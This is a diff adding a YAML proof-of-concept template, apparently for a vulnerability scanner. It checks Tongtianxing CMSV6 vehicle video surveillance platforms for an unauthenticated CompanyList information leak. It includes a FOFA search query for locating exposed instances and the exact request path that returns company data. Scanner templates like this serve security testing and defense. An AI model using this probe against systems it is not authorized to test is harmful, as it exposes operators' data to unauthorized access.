@@ -1,0 +1,15 @@
+id: poc-yaml-g-sky-cmsv6-companylist-info-leak
+info:
+  name: 通天星CMS V6车载视频监控平台 CompanyList 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: cmsv6
+  fofa: body="./open/webApi.html" || body="/808gps/"
+requests:
+- method: GET
+  path: /StandardApiAction_findCompanyList.action
+  expression: status_code == 200 && matches(body,"\"name\":\".*?\"") && contains(body,"\"companys\":")
+    && contains(body,"\"id\":") && contains(content_type,"application/json")
+variables: {}
+transport: http
